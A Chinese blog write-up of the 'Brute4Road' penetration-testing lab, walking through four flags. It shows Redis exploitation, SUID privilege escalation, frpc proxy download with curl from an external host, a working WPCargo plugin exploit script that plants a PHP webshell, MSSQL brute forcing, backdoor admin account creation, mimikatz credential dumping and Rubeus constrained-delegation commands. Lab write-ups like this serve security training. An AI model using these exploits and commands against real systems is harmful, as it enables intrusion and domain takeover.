---
title: 春秋云镜 Brute4Road
date: 2023-08-28 17:20:00
tags:
- web
categories:
- [笔记, web笔记]
---

#### flag1

fscan扫描发现，6379开放ftp可以匿名登录

![image-20230825092314642](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715828.png)

这里直接尝试了去打redis但是只有主从复制能成功（这里应该是靶场有设置吧，对6379操作过后再次操作就会显示端口拒绝访问直接重置就可以了）

之后用脚本一把梭哈即可获得shell

```shell
#更改交互方式
python -c 'import pty;pty.spawn("/bin/bash");'
#查找特权位
sudo -l
#suid查找
find / -perm -u=s -type f 2>/dev/null
#提权获取flag
base64 "/home/redis/flag/flag01"|base64 --decode
```

![image-20230825092737360](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715849.png)

#### flag2

靶机上ifconfig,ip addr,arp -a都不存在最后使用`hostname -l`获取所在网段；

![image-20230828170633084](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715859.png)

上传代理工具

```shell
curl http://vps/frpc --output frpc
curl http://vps/frpc.ini --output frpc.ini
```

**tips:socks只能代理tcp的流量，ping走的是icmp，所以我们就算使用代理也是不能给ping使用的。**

接着使用fscan探测c段

```
./fscan -h 172.22.2.1/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.1
start infoscan
已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.18     is alive
(icmp) Target 172.22.2.34     is alive
[*] Icmp alive hosts len is: 5
172.22.2.16:80 open
172.22.2.18:80 open
172.22.2.18:22 open
172.22.2.7:80 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.16:1433 open
172.22.2.34:445 open
172.22.2.18:445 open
172.22.2.16:445 open
172.22.2.3:445 open
172.22.2.34:139 open
172.22.2.34:135 open
172.22.2.16:139 open
172.22.2.18:139 open
172.22.2.3:139 open
172.22.2.16:135 open
172.22.2.3:135 open
172.22.2.7:6379 open
172.22.2.3:88 open
[*] alive ports len is: 20
start vulscan
[+] NetInfo:
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] 172.22.2.34          XIAORANG\CLIENT01          
[+] NetInfo:
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] 172.22.2.3     [+]DC XIAORANG\DC                Windows Server 2016 Datacenter 14393
[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)
[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[+] NetInfo:
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] WebTitle:http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] WebTitle:http://172.22.2.16        code:404 len:315    title:Not Found
[*] 172.22.2.18          WORKGROUP\UBUNTU-WEB02      
[*] 172.22.2.16          XIAORANG\MSSQLSERVER       Windows Server 2016 Datacenter 14393
[+] ftp://172.22.2.7:21:anonymous 
   [->]pub
[*] WebTitle:http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
已完成 19/20 [-] redis 172.22.2.7:6379 redis123 <nil>
已完成 19/20 [-] redis 172.22.2.7:6379 123456!a <nil>
已完成 19/20 [-] redis 172.22.2.7:6379 1qaz!QAZ <nil>
已完成 20/20
```

根据fscan扫描结果进行总结

```
(icmp) Target 172.22.2.3      is alive  DC
(icmp) Target 172.22.2.7      is alive  出网机
(icmp) Target 172.22.2.16     is alive  mssqlserver
(icmp) Target 172.22.2.18     is alive  wpscan站点
```

先从wordpress进行入手，wpscan扫描进行信息搜集

![image-20230827153154969](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715874.png)

这个插件存在漏洞

```python
import sys
import binascii
import requests
# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'
def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')
text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]
destination_url = 'http://172.22.2.18/'
cmd = 'ls'
# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)
# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

执行脚本将木马植入，因为写入的木马是system，所以调换蚁剑连接模式

![image-20230827154020334](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715892.png)

之后找到wordpress配置文件，找到数据库密码，进行连接（这里也可以再本地使用navicate进行连接，思路并不是唯一的，习惯熟练才是最重要的）

![image-20230827154253001](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715904.png)

获得第二个flag

![image-20230827154314333](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715873.png)

#### flag3

我们在数据库中发现另一些提示是一个存储密码的表，猜测应该存在`(icmp) Target 172.22.2.16 is alive  mssqlserver`的密码；我们用hyder进行爆破

![image-20230827154730841](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715882.png)

获取密码，然后利用工具进行连接，根据前期的收集这是一台windos主机，进行简单的信息收集

![image-20230827155047357](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715891.png)

我们发现3389开放，尝试提权写入用户进行远程连接

![image-20230827154941259](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715903.png)

提权成功，写入用户

```shell
#添加用户hack 密码admin!@#45
net user hack admin!@#45 /add
#加入管理员组
net localgroup administrators hack /add
```

之后再`C:\USERS\ADMINISTRATOR\FLAG`中获得第三个flag

![image-20230827155328410](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715915.png)

#### flag4

再次进行信息收集（**tips:值得注意的是我们现在并不在域内，因为我们登录的用户并不是域成员**），但不影响我们寻找域控，通过报错信息or前期fscan扫描结果我们都可以轻松判断出域控主机是`172.22.2.3`;

mimikate抓取内存

```shell
#提权
privilege::debug
#抓密码
sekurlsa::logonpasswords
```

![image-20230828160039651](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715934.png)

找到服务账户尝试进行约束委派攻击（我们也可以通过setspn的方式进行判断）

```shell
#申请票据
.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:抓到的NTML /domain:xiaorang.l ab /dc:DC.xiaorang.lab /nowrap
#注入票据
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.l
ab /ptt /ticket:上面生成的结果
```

![image-20230828171936364](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281719461.png)

注入成功这时候我们能成功访问域控主机，读取flag

```shell
type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```

![image-20230828160056545](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715092.png)

#### 总结

- 对工具模块利用不熟悉
- ，信息收集不完善不到位，横向时的方法选择思路不清晰

#### 参考文章

[【仿真场景】Brute4Road - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/581577873)

[靶场练习--春秋云境-Brute4Road_NooEmotion的博客-CSDN博客](https://blog.csdn.net/qq_45746286/article/details/128775222)